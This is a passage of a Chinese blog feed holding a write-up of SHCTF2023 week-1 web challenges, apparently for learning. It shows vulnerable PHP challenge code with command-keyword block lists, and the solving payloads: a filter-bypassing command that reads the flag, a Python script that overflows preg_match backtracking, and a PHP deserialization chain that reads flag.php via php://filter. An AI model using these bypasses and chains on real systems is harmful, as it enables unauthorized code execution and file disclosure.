9ac1d8ee27b73d8d7d7184ded395112fd33526dbd75af61de1731ed8ff3d1cf0b419942b81596173fae6cd07f06f93b1469dfddabc9db7414543a0861989e938a09334f19ffb9b6bf925d985fbe42e86bd86297a92077b560a353cbc7487737c528c8d905d9bcc81caede65c354655c6abdb658e293757ac70124fc2f8ec821f69dc403d814642617c27f333610f1bf9dc359e39965254efadf6e2861edced17df73ec8cb5b0f906f7327fc023a4e9b44f100527bebf31649963edc4441e3de98b09cab552ecc3d54dfe8501f513e241511defd0c26836b62f886ebfc2e56f22d7a9c7bf0588c66c321eee47e46c2cecaefbd23c2030233a0ba361e0e16f0e7e6a6456b98dbbe22ba5fc3e1e71c472d5e269aaf36d4499a97153459697bf67fdf1d97d4c6c7a809000066b0d56f02144a28f8d749a4f2e54f27c5528876ad5de55db7</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>SHCTF2023</title>
    <url>/2023/10/06/SHCTF2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h3 id="WEEK1-babyRCE"><a href="#WEEK1-babyRCE" class="headerlink" title="[WEEK1]babyRCE"></a>[WEEK1]babyRCE</h3><p>考点：命令执行绕过</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$rce</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'rce'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\>|\&lt;|\'|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hhhhhhacker!!!"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>过滤了cat，使用<code>rce=c\at$&#123;IFS&#125;/fl??</code>。</p>
<h3 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" title="[WEEK1]1zzphp"></a>[WEEK1]1zzphp</h3><p>考点：数组绕过，回溯绕过preg_match</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./index.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c_ode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c_ode'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?SHCTF/is'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no touch!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'2023SHCTF'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'what do you want'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?SHCTF/is'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no touch!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'2023SHCTF'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'what do you want'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里首先要匹配SHCTF前面是否有字符，由于有**.**的限制，以及&#x2F;is修饰符的限制：</p>
<blockquote>
<ul>
<li>i (PCRE_CASELESS)<br>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。</li>
<li>s (PCRE_DOTALL)<br>如果设置了这个修饰符，模式中的点号元字符匹配所有字符，包含换行符。如果没有这个 修饰符，点号不匹配换行符。这个修饰符等同于 perl 中的&#x2F;s修饰符。 一个取反字符类比如 [^a] 总是匹配换行符，而不依赖于这个修饰符的设置。</li>
</ul>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/3557032fdb5c4508b9d2d555b8040c38.png" alt="1"></p>
<p>这行代码的作用是检查变量 $code 中是否包含任意字符（包括换行符），然后紧跟着 SHCTF（不区分大小写）。如果匹配成功，条件语句就会为真（true），可以执行条件为真时的代码块。</p>
<p><strong>这里可以使用正则回溯最大次数上限绕过preg_match</strong><a href="https://xz.aliyun.com/t/10219">参考链接</a><br>最后的python脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

<span class="token comment"># 目标URL</span>
url <span class="token operator">=</span> <span class="token string">'http://112.6.51.212:31314/?num[]=m'</span>  <span class="token comment"># 请替换为实际的目标URL</span>

<span class="token comment"># 要发送的POST参数</span>
payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'c_ode'</span><span class="token punctuation">:</span><span class="token string">'very'</span><span class="token operator">*</span><span class="token number">260000</span><span class="token operator">+</span><span class="token string">'2023SHCTF'</span><span class="token punctuation">&#125;</span>

<span class="token comment"># 发送POST请求</span>
response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
<span class="token comment"># 打印响应内容</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>知识点：<br><a href="https://www.sqlsec.com/2020/07/preg_replace.html">国光师傅的PHP preg_系列漏洞小结</a></p>
<h3 id="WEEK1-ez-serialize"><a href="#WEEK1-ez-serialize" class="headerlink" title="[WEEK1]ez_serialize"></a>[WEEK1]ez_serialize</h3><p>考点：php反序列化<br>不太擅长php反序列化，还是要好好看每一道反序列化题。。。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$var_1</span><span class="token punctuation">;</span>
  
  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
   <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var_1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$q</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">q</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>           
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">z</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>关键是A类中的<strong>include()函数</strong>通过文件包含拿到flag。<br>开始串链子。。。</p>
<p><code>** __invoke魔术方法**</code></p>
<blockquote>
<p>魔术方法 __invoke() 会在将一个对象当作一个方法来使用时会自动调用。<br>下面的代码，我们给 <code>Person</code> 类添加上 <code>__invoke()</code> 魔术方法，然后我们就可以将它的实例当作普通方法来调用了。</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span>  <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string single-quoted-string">'Male'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span>  <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sex</span>  <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string single-quoted-string">'你好，我的名字是: '</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'，我 '</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">.</span><span class="token string single-quoted-string">' 岁了。'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$person</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Yufei'</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Male'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token variable">$person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那么如果将A类与其他类相连，那就根据<code>__invoke()</code>与D类相关起来。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将对象当成了一个方法会调用__invoke()。</span>
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>B类中触发<code>__wakeup()</code>：</p>
<blockquote>
<p>当使用 unserialize() 反序列化一个对象成功后，会自动调用该对象的 __wakup() 魔术方法。</p>
</blockquote>
<p>C类中触发<code>__toString()</code>：</p>
<blockquote>
<p>在把对象转换成字符串时自动调用</p>
</blockquote>
<p>最后的代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$var_1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$q</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">q</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">z</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">-></span><span class="token property">var_1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到<br><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;q&quot;;O:1:&quot;C&quot;:2:&#123;s:3:&quot;var&quot;;N;s:1:&quot;z&quot;;O:1:&quot;D&quot;:1:&#123;s:1:&quot;p&quot;;O:1:&quot;A&quot;:1:&#123;s:5:&quot;var_1&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/e6a723da29b5436689b78b35619a18c3.png" alt="2"></p>
<h3 id="WEEK1-登录就给flag"><a href="#WEEK1-登录就给flag" class="headerlink" title="[WEEK1]登录就给flag"></a>[WEEK1]登录就给flag</h3><p><img src="https://img-blog.csdnimg.cn/ffb2aac663074c77ab96fcb980ccc273.png" alt="12"><br>用户名密码admin&#x2F;password<br><img src="https://img-blog.csdnimg.cn/cb6374f9e73f41dcad4f2f3a301bba83.png" alt="2"></p>
<h3 id="WEEK1-飞机大战"><a href="#WEEK1-飞机大战" class="headerlink" title="[WEEK1]飞机大战"></a>[WEEK1]飞机大战</h3><p>flag就在前端，找就行了。<br><img src="https://img-blog.csdnimg.cn/eb16f34b08574889a6c83f04750bb711.png" alt="1"><br>解码一下unicode-&gt;base64-&gt;flag。</p>
<h3 id="WEEK1-ezphp"><a href="#WEEK1-ezphp" class="headerlink" title="[WEEK1]ezphp"></a>[WEEK1]ezphp</h3><p>知识点：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pattern'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$pattern</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pattern'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%/i"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$pattern</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'print_r("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you are smart"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"try again"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"it is begin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>因为字符串中的特殊字符需要转义，所以<code>\\1</code>实际上就是<code> \1</code>, 而 <code>\1</code> 在正则表达式中表示反向引用。</p>
<blockquote>
<p>对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个<strong>临时缓冲区</strong>中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从<code>1</code>开始，最多可存储<code>99</code>个捕获的子表达式。每个缓冲区都可以使用<code>\n</code> 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
</blockquote>
<p>引入一个例子理解一下<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></p>
<table>
<thead>
<tr>
<th>正则表达式</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>.</code></td>
<td>匹配除换行符以外的任意字符</td>
</tr>
<tr>
<td><code>\s</code></td>
<td>匹配任意的空白符</td>
</tr>
<tr>
<td><code>\S</code></td>
<td>匹配任何非空白字符</td>
</tr>
<tr>
<td><code>+</code></td>
<td>匹配前面的子表达式一次或多次</td>
</tr>
</tbody></table>
<p><img src="https://img-blog.csdnimg.cn/363feed2972e432a8558d32102c4a1bf.png" alt="1"></p>
<h3 id="WEEK1-生成你的邀请函吧"><a href="#WEEK1-生成你的邀请函吧" class="headerlink" title="[WEEK1]生成你的邀请函吧~"></a>[WEEK1]生成你的邀请函吧~</h3><p><img src="https://img-blog.csdnimg.cn/72cb3c9f90a8402b9a32ef9287dd9387.png" alt="1"><br>按照他说的得到的图片下面就是flag。</p>
<h3 id="WEEK2-MD5的事就拜托了"><a href="#WEEK2-MD5的事就拜托了" class="headerlink" title="[WEEK2]MD5的事就拜托了"></a>[WEEK2]MD5的事就拜托了</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
